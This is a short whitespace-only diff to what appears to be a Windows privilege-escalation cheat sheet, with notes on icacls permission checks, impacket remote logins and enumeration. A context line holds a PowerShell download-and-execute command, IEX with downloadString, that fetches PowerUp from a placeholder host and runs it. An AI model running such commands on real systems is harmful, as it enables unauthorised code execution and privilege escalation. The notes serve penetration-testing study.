@@ -187,8 +187,6 @@ Check if Windows version has any known vulnerability (also check the patches app
 	Check permissions using icacls
 		https://ss64.com/nt/icacls.html
 
-
-
 ## Remote Login with username and password
 
 We can try doing remote logins with useranmes and passwords using a script from impacket
@@ -217,6 +215,7 @@ IEX(New-Object Net-WebClient).downloadString("http://myhostwiththescript/PowerUp
 #Then run is ps:
 Invoke-AllChecks
 ```
+
 
 ## Other Info
 
